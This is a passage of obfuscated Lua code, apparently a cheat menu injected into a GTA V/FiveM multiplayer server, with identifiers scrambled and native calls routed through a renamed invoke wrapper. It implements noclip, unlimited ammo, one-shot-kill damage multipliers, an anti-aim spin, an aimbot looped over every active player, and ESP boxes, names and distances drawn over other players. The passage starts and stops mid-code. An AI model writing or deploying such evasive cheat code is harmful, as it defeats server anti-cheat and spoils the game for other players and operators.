									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 471)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "cargobob") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "cargobob2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "cargobob3") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "cargobob4") then -- Cargobobs
								if blipSprite_DSIOGJOISDGSDG ~= 481 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 481)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "technical") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "technical2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "technical3") then -- Technical
								if blipSprite_DSIOGJOISDGSDG ~= 426 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 426)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, false) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "taxi") then -- Cab/ Taxi
								if blipSprite_DSIOGJOISDGSDG ~= 198 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 198)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "fbi") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "fbi2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "police2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "police3") -- Police Vehicles
								or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "police") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "sheriff2") or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "sheriff")
								or vehModel_DSIOGJSODGSD == sritizen_INVOKE_PN(0xD24D37CC275948CC, "policeold2") then
								if blipSprite_DSIOGJOISDGSDG ~= 56 then
									sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 56)
									sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
								end
							elseif blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
								sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
								sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator
							end

							-- Show number in case of passangers
							local passengers_DIFJOSDIGSDGSD = GetVehicleNumberOfPassengers_PN_DSGUHSDIGSDGDS(veh_DSGIJSODGSDG)

							if passengers_DIFJOSDIGSDGSD > 0 then
								if not IsVehicleSeatFree_PN_DUHGYUSFGFD(veh_DSGIJSODGSDG, -1) then
									passengers_DIFJOSDIGSDGSD = passengers_DIFJOSDIGSDGSD + 1
								end
								sritizen_INVOKE_PN(0xA3C0B359DCB848B6, blip_DSUFSDGSD, passengers_DIFJOSDIGSDGSD)
							else
								sritizen_INVOKE_PN(0x532CFF637EF80148, blip_DSUFSDGSD)
							end
						else
							-- Remove leftover number
							sritizen_INVOKE_PN(0x532CFF637EF80148, blip_DSUFSDGSD)

							if blipSprite_DSIOGJOISDGSDG ~= 1 then -- default blip_DSUFSDGSD
								sritizen_INVOKE_PN(0xDF735600A4696DAF, blip_DSUFSDGSD, 1)
								sritizen_INVOKE_PN(0x5FBCA48327B914DF, blip_DSUFSDGSD, true) -- ~g~Player blip_DSUFSDGSD indicator

							end
						end

						sritizen_INVOKE_PN(0xF87683CDF73C3F6E, blip_DSUFSDGSD, math.ceil(GetEntityHeading_PN_UDYUGDHIGKDFG(veh_DSGIJSODGSDG))) -- update rotation
						sritizen_INVOKE_PN(0x127DE7B20C60A6A3, blip_DSUFSDGSD, id_DSHGSIUDGSD) -- update blip_DSUFSDGSD name
						sritizen_INVOKE_PN(0xD38744167B2FA257, blip_DSUFSDGSD,  0.85) -- set scale

						-- set player alpha
						if sritizen_INVOKE_PN(0xB0034A223497FFCB) then
							sritizen_INVOKE_PN(0x45FF974EEE1C8734, blip_DSUFSDGSD, 255 )
						else
							x1_DASUIHDSGSDGSD, y1_DASUIHDSGSDGSD = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6), true))
							x2_DASUIHDSGSDGSD, y2_DASUIHDSGSDGSD = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, id_DSHGSIUDGSD), true))
							distance_idshgsdgsdfg = (math.floor(math.abs(math.sqrt((x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) * (x1_DASUIHDSGSDGSD - x2_DASUIHDSGSDGSD) + (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD) * (y1_DASUIHDSGSDGSD - y2_DASUIHDSGSDGSD))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance_idshgsdgsdfg < 0 then
								distance_idshgsdgsdfg = 0
							elseif distance_idshgsdgsdfg > 255 then
								distance_idshgsdgsdfg = 255
							end
							sritizen_INVOKE_PN(0x45FF974EEE1C8734, blip_DSUFSDGSD, distance_idshgsdgsdfg)
						end
					end
				end
			end
		else
			local plist_DSGUSDIGDS = GetActivePlayers_PN_UDGYUDFIGKDFGDF()
			for i_SDUGIHSDGSDGDSG = 1, #plist_DSGUSDIGDS do
				local id_DSHGSIUDGSD = plist_DSGUSDIGDS[i_SDUGIHSDGSDGDSG]
				local ped_DSGUISDGSDG = sritizen_INVOKE_PN(0x43A66C31C68491C0, id_DSHGSIUDGSD)
				local blip_DSUFSDGSD = sritizen_INVOKE_PN(0xBC8DBDCA2436F7E8, ped_DSGUISDGSDG)
				if sritizen_INVOKE_PN(0xA6DB27D19ECBB7DA, blip_DSUFSDGSD) then -- Removes blip_DSUFSDGSD
					sritizen_INVOKE_PN(0x86A652570E5F25DD, Citizen.PointerValueIntInitialized(blip_DSUFSDGSD))
				end
			end
		
		end

if Becoome_A_Flesz_131DA_PN then
	sritizen_INVOKE_PN(0x57FFF03E423A4C0B, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6))
	sritizen_INVOKE_PN(0x6DB47AA77FD94E09, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.49)
	sritizen_INVOKE_PN(0x085BF80FA50A39D1, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 10.0)
	sritizen_INVOKE_PN(0xB80D8756B4668AB6, tostring('core'))
	sritizen_INVOKE_PN(0x6C38AF3693A69A91, tostring('core'))
	sritizen_INVOKE_PN(0xC95EB1DB6E92113D, tostring('ent_sht_electrical_box'), sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end

if Noclip31eqd_PN then
	local current_Speed_dishgosdfiulgjdsfg = 2
	local Noclip_Entity_UHDGIUDFLGDFG =
		sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0xD80958FC74E988A6), false) and sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6)) or sritizen_INVOKE_PN(0xD80958FC74E988A6)
	sritizen_INVOKE_PN(0x428CA6DBD1094446, sritizen_INVOKE_PN(0xD80958FC74E988A6), true)
	sritizen_INVOKE_PN(0x3882114BDE571AD4, sritizen_INVOKE_PN(0xD80958FC74E988A6), true)
	
	if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["LEFTSHIFT"]) then
	current_Speed_dishgosdfiulgjdsfg = 6
	end

	local new_Pos_dihsufoiugidsfgdsfg = GetEntityCoords_PN_UDHGIUDIKGDFG(enstrititi)

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 32, true) --MoveUpOnly
	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 268, true) --MoveUp

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 31, true) --MoveUpDown

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 269, true) --MoveDown
	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 33, true) --MoveDownOnly

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 266, true) --MoveLeft
	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 34, true) --MoveLeftOnly

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 30, true) --MoveLeftRight

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 267, true) --MoveRight
	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 35, true) --MoveRightOnly

	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 44, true) --Cover
	sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 20, true) --MultiplayerInfo

	local y_off_idfhusdgiolgdsigsdrssdfg = 0.0
	local z_off_dauigisdfhgodsfgdsg = 0.0

		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 32) then
			y_off_idfhusdgiolgdsigsdrssdfg = 0.5
		end
		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 33) then
			y_off_idfhusdgiolgdsigsdrssdfg = -0.5
		end
		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 34) then
			sritizen_INVOKE_PN(0x8E2530AA8ADA980E, sritizen_INVOKE_PN(0xD80958FC74E988A6), GetEntityHeading_PN_UDYUGDHIGKDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6)) + 3.0)
		end
		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 35) then
			sritizen_INVOKE_PN(0x8E2530AA8ADA980E, sritizen_INVOKE_PN(0xD80958FC74E988A6), GetEntityHeading_PN_UDYUGDHIGKDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6)) - 3.0)
		end
		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 44) then
			z_off_dauigisdfhgodsfgdsg = 0.21
		end
		if sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, 0, 20) then
			z_off_dauigisdfhgodsfgdsg = -0.21
	end

	new_Pos_dihsufoiugidsfgdsfg =
		GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(Noclip_Entity_UHDGIUDFLGDFG, 0.0, y_off_idfhusdgiolgdsigsdrssdfg * (current_Speed_dishgosdfiulgjdsfg + 0.3), z_off_dauigisdfhgodsfgdsg * (current_Speed_dishgosdfiulgjdsfg + 0.3))

	local heading_idfhgsodiugsdrsdfg = GetEntityHeading_PN_UDYUGDHIGKDFG(Noclip_Entity_UHDGIUDFLGDFG)
	sritizen_INVOKE_PN(0x1C99BB7B6E96D16F, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0)
	sritizen_INVOKE_PN(0x8524A8B0171D5E07, Noclip_Entity_UHDGIUDFLGDFG, 0.0, 0.0, 0.0, 0, false)
	sritizen_INVOKE_PN(0x8E2530AA8ADA980E, Noclip_Entity_UHDGIUDFLGDFG, heading_idfhgsodiugsdrsdfg)

	sritizen_INVOKE_PN(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, false, false)
	sritizen_INVOKE_PN(0x239A3351AC1DA385, Noclip_Entity_UHDGIUDFLGDFG, new_Pos_dihsufoiugidsfgdsfg.x, new_Pos_dihsufoiugidsfgdsfg.y, new_Pos_dihsufoiugidsfgdsfg.z, true, true, true)

	sritizen_INVOKE_PN(0x428CA6DBD1094446, Noclip_Entity_UHDGIUDFLGDFG, false)
	sritizen_INVOKE_PN(0x3882114BDE571AD4, Noclip_Entity_UHDGIUDFLGDFG, false)
	sritizen_INVOKE_PN(0x1A9205C1B9EE827F, Noclip_Entity_UHDGIUDFLGDFG, true, true)
end

if tszeciaosobka13_31_PN then
	sritizen_INVOKE_PN(0x5A4F9EDF1673F704, 0)
	sritizen_INVOKE_PN(0xAC253D7842768F48, 0)
	sritizen_INVOKE_PN(0xDE2EF5DA284CC8DF)
end

if drajfbaj31_3_PN then
sritizen_INVOKE_PN(0x6E8834B52EC20C77, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), true)
end


if cejlowin_1_anteksuck_PN then
local aiming_idhgsiduhgidf, enstrititi = GetEntityPlayerIsFreeAimingAt(sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), enstrititi)
local aiming_idhgsiduhgidf2 = sritizen_INVOKE_PN(0x2E397FD2ECD37C87, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6))
	if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("+",0.495,0.484)
	elseif aiming_idhgsiduhgidf then
	if sritizen_INVOKE_PN(0x524AC5ECEA15343E, enstrititi) and not sritizen_INVOKE_PN(0x3317DEDB88C95038, enstrititi, 0) and sritizen_INVOKE_PN(0x12534C348C6CB68B, enstrititi) then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~+",0.495,0.484)
	else
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("+",0.495,0.484)
	end
end
end


if cejlowin_2_anteksuck_PN then
local aiming_idhgsiduhgidf, enstrititi = GetEntityPlayerIsFreeAimingAt(sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), enstrititi)
local aiming_idhgsiduhgidf2 = sritizen_INVOKE_PN(0x2E397FD2ECD37C87, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6))
	if aiming_idhgsiduhgidf2 and not aiming_idhgsiduhgidf then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg(".",0.4968,0.478)
	elseif aiming_idhgsiduhgidf then
	if sritizen_INVOKE_PN(0x524AC5ECEA15343E, enstrititi) and not sritizen_INVOKE_PN(0x3317DEDB88C95038, enstrititi, 0) and sritizen_INVOKE_PN(0x12534C348C6CB68B, enstrititi) then
		narysuj_celownik_xd_uhfaidsoulgdfsdfg("~r~.",0.4968,0.478)
	else
		narysuj_celownik_xd_uhfaidsoulgdfsdfg(".",0.4968,0.478)
	end
end
end

if nieskonczonaamunicja419851_PN then
	for sinksianksionk=1, #ALLWEAPONSY_PN do
	sritizen_INVOKE_PN(0x183DADC6AA953186, sritizen_INVOKE_PN(0xD80958FC74E988A6), true)
	sritizen_INVOKE_PN(0x3EDCB0505123623B, sritizen_INVOKE_PN(0xD80958FC74E988A6), true, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk])
	end
else
	for sinksianksionk=1, #ALLWEAPONSY_PN do
		sritizen_INVOKE_PN(0x183DADC6AA953186, sritizen_INVOKE_PN(0xD80958FC74E988A6), false)
		sritizen_INVOKE_PN(0x3EDCB0505123623B, sritizen_INVOKE_PN(0xD80958FC74E988A6), false, "WEAPON_"..ALLWEAPONSY_PN[sinksianksionk])
	end
end

if ONESZOTONEKILL_PN then
sritizen_INVOKE_PN(0xCE07B9F7817AADA3, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 10000.0)
sritizen_INVOKE_PN(0x4A3DC7ECCC321032, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 10000.0)
else
sritizen_INVOKE_PN(0xCE07B9F7817AADA3, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.0)
sritizen_INVOKE_PN(0x4A3DC7ECCC321032, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), 1.0)
end



if ANTIAJM519075_PN then
local ped_DSIHGUSDGSD = sritizen_INVOKE_PN(0xD80958FC74E988A6)
heading_ADIGSDGSD = heading_ADIGSDGSD + math.random(30,50)
if heading_ADIGSDGSD == 360 then
heading_ADIGSDGSD = 0
else
local ped_DSIHGUSDGSD = sritizen_INVOKE_PN(0x43A66C31C68491C0, -1 )
sritizen_INVOKE_PN(0x6EA47DAE7FAD0EED, "move_ped_crouched")

while ( not sritizen_INVOKE_PN(0xC4EA073D86FB29B0, "move_ped_crouched", Citizen.ReturnResultAnyway()) ) do 
    PN_WAIT_31DA31_PN( 100 )
end 

if ( crouched_DSIHGIUSDGSD == true ) then 
    sritizen_INVOKE_PN(0xAA74EC0CB0AAEA2C, ped_DSIHGUSDGSD, 0 )
    crouched_DSIHGIUSDGSD = false 
elseif ( crouched_DSIHGIUSDGSD == false ) then
    sritizen_INVOKE_PN(0xAF8A94EDE7712BEF, ped_DSIHGUSDGSD, "move_ped_crouched", 0.25 )
    crouched_DSIHGIUSDGSD = true 
end
sritizen_INVOKE_PN(0x8E2530AA8ADA980E, ped_DSIHGUSDGSD, IntToFloat_NUGTHBGNURTHNHTR(heading_ADIGSDGSD))
end
end

if wkurwionyrejgbot31_PN then
    
    local plist_iduygusdigsdfg = GetActivePlayers_PN_UDGYUDFIGKDFGDF()
    for sinksianksionk = 1, #plist_iduygusdigsdfg do
        rage_bot_UGDUYFHDSIGKHUIDFGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk]))
    end

end


          if esp_duhsgiudfgdfg then
            for sinksianksionk=1,256 do
              if  ((sritizen_INVOKE_PN(0xB8DFD30D6973E135, sinksianksionk )) and sritizen_INVOKE_PN(0x43A66C31C68491C0, sinksianksionk ) ~= sritizen_INVOKE_PN(0x43A66C31C68491C0, -1 )) then
                local kolorek_espa_xd_IDHFUDSHUIFDSF = {r = 0, g = 191, b = 41}
                local pPed_dushsigdsfgdf = sritizen_INVOKE_PN(0x43A66C31C68491C0, sinksianksionk)
                local cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6, -1)))
                local x, y, z = table.unpack(GetEntityCoords_PN_UDHGIUDIKGDFG(pPed_dushsigdsfgdf))
                local disPlayerNames_udsguydgdresd = 130
                local disPlayerNamesz_dusghudfhigsdfg = 999999
				local distance_idshgisudfgsdfg = math.floor(GetDistanceBetweenCoords_PN_UDHGIUSDHGIUDF(cx_duihsgiudfgdf,  cy_duhifsudgsdfg,  cz_dsyaugfidsgsdf,  x,  y,  z,  true))
                  if nameabove_duhsgsiudgsdgrdf then
                      if ((distance_idshgisudfgsdfg < disPlayerNames_udsguydgdresd)) then
                        if sritizen_INVOKE_PN(0x031E11F3D447647E, sinksianksionk, Citizen.ReturnResultAnyway()) then
                          DrawText3D_PN_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId_PN_DUHGIUSHGUFD(sinksianksionk).." |  "..GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(sinksianksionk), 21, 0, 255)
                        else
                          DrawText3D_PN_UDGUYSDHUGSFFDG(x, y, z+1.2, GetPlayerServerId_PN_DUHGIUSHGUFD(sinksianksionk).." |  "..GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(sinksianksionk), kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b)
                        end
                      end
                  end
                local message_UDYUGSIDGFDG =
                "Name: "..
                GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(sinksianksionk) ..
                "\nServer ID: "..
                GetPlayerServerId_PN_DUHGIUSHGUFD(sinksianksionk) ..
                "\nDist: ".. math_round_DSIHGIUDFJGIDF(GetDistanceBetweenCoords_PN_UDHGIUSDHGIUDF(cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, true), 1)
                if ((distance_idshgisudfgsdfg < disPlayerNamesz_dusghudfhigsdfg)) then
                if espinfo_ihfdsoudgifgdfg and esp_duhsgiudfgdfg then
                  DrawText3D_PN_UDGUYSDHUGSFFDG(x, y, z - 1.0, message_UDYUGSIDGFDG, kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b)
                end
                if espbox_dsuhfisdugsdfg and esp_duhsgiudfgdfg then
                  local LineOneBegin_GDUYSYUFDGREGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local LineOneEnd_DUIYGUISHIGFDGFDG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoBegin_UIDSGISDGGFDGF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)
                  local LineTwoEnd_DISUIHFIUSDGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeBegin_UDHIGUFFDGIHUDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local LineThreeEnd_DSUYFTUDSGYFDSFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local LineFourBegin_SUAYGFTDGSUYFSD = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)

                  local TLineOneBegin_DGUFYHDSIGDFHU = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
                  local TLineOneEnd_UDGUFYIHIFGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoBegin_DIOUHGIUDFGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local TLineTwoEnd_DSUGHIUFSDGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeBegin_IDUSHGIUDFGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local TLineThreeEnd_DUSYGUIDSGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local TLineFourBegin_DSUGYFISDGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)

                  local ConnectorOneBegin_DSUGHISDUGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, 0.8)
                  local ConnectorOneEnd_DUSGIHUDGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, 0.3, -0.9)
                  local ConnectorTwoBegin_USDHIUFDSGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, 0.8)
                  local ConnectorTwoEnd_QUTGFIDYGFSUGFSG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, 0.3, -0.9)
                  local ConnectorThreeBegin_LDSIGHSDGHKDFSGDF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, 0.8)
                  local ConnectorThreeEnd_UAIDGYIHDSHGODF = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, -0.3, -0.3, -0.9)
                  local ConnectorFourBegin_SDUYFGTUDSIGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, 0.8)
                  local ConnectorFourEnd_ASUHYFIUDSGDFG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(pPed_dushsigdsfgdf, 0.3, -0.3, -0.9)

                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  LineOneBegin_GDUYSYUFDGREGDFG.x,
                  LineOneBegin_GDUYSYUFDGREGDFG.y,
                  LineOneBegin_GDUYSYUFDGREGDFG.z,
                  LineOneEnd_DUIYGUISHIGFDGFDG.x,
                  LineOneEnd_DUIYGUISHIGFDGFDG.y,
                  LineOneEnd_DUIYGUISHIGFDGFDG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  LineTwoBegin_UIDSGISDGGFDGF.x,
                  LineTwoBegin_UIDSGISDGGFDGF.y,
                  LineTwoBegin_UIDSGISDGGFDGF.z,
                  LineTwoEnd_DISUIHFIUSDGDF.x,
                  LineTwoEnd_DISUIHFIUSDGDF.y,
                  LineTwoEnd_DISUIHFIUSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  LineThreeBegin_UDHIGUFFDGIHUDF.x,
                  LineThreeBegin_UDHIGUFFDGIHUDF.y,
                  LineThreeBegin_UDHIGUFFDGIHUDF.z,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  LineThreeEnd_DSUYFTUDSGYFDSFG.x,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.y,
                  LineThreeEnd_DSUYFTUDSGYFDSFG.z,
                  LineFourBegin_SUAYGFTDGSUYFSD.x,
                  LineFourBegin_SUAYGFTDGSUYFSD.y,
                  LineFourBegin_SUAYGFTDGSUYFSD.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  TLineOneBegin_DGUFYHDSIGDFHU.x,
                  TLineOneBegin_DGUFYHDSIGDFHU.y,
                  TLineOneBegin_DGUFYHDSIGDFHU.z,
                  TLineOneEnd_UDGUFYIHIFGDFG.x,
                  TLineOneEnd_UDGUFYIHIFGDFG.y,
                  TLineOneEnd_UDGUFYIHIFGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  TLineTwoBegin_DIOUHGIUDFGDF.x,
                  TLineTwoBegin_DIOUHGIUDFGDF.y,
                  TLineTwoBegin_DIOUHGIUDFGDF.z,
                  TLineTwoEnd_DSUGHIUFSDGDF.x,
                  TLineTwoEnd_DSUGHIUFSDGDF.y,
                  TLineTwoEnd_DSUGHIUFSDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  TLineThreeBegin_IDUSHGIUDFGDF.x,
                  TLineThreeBegin_IDUSHGIUDFGDF.y,
                  TLineThreeBegin_IDUSHGIUDFGDF.z,
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  TLineThreeEnd_DUSYGUIDSGDF.x,
                  TLineThreeEnd_DUSYGUIDSGDF.y,
                  TLineThreeEnd_DUSYGUIDSGDF.z,
